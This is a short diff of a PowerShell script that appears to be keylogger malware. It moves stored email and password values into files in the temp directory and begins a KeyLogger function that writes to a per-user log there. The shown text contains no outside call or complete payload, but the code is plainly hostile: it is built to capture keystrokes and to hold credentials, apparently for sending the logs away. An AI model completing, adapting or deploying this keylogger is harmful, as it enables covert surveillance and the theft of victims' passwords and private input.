@@ -1,6 +1,6 @@
 
-$email = Get-Content -Path .\KHPWMpTitfZ.txt
-$password = Get-Content -Path .\oSyEZsgTWIU.txt
+$email = Get-Content -Path $env:temp\KHPWMpTitfZ.txt
+$password = Get-Content -Path $env:temp\oSyEZsgTWIU.txt
 
 function KeyLogger($logFilePath = "$env:temp/$env:Username.log"){
 
